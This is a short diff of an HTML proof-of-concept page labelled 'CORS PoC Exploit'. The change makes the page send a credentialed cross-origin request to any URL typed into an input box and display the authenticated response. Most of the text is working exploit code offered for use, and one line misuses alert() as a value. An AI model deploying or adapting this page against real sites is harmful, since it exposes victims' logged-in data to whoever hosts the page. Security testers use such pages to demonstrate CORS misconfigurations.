@@ -11,18 +11,21 @@
             document.getElementById("emo").innerHTML = alert(this.responseText);
           }
         };
-        xhttp.open("GET", "https://example.com/authed_page.html ", true);
+        value=document.getElementById("urlInput").value
+        xhttp.open("GET", value, true);
         xhttp.withCredentials = true;
         xhttp.send();
+        console.log('done');
       }
     </script>
   </head>
   <body>
     <center>
       <h2>CORS PoC Exploit </h2>
-      <h3>Found by DDAZZA</h3>
+      <h3>by DDAZZA</h3>
       <h3>Show full content of page</h3>
       <div id="demo">
+        <input id="urlInput" type="text" value="http://example.com">
         <button type="button" onclick="cors()">Try Exploit</button>
       </div>
   </body>
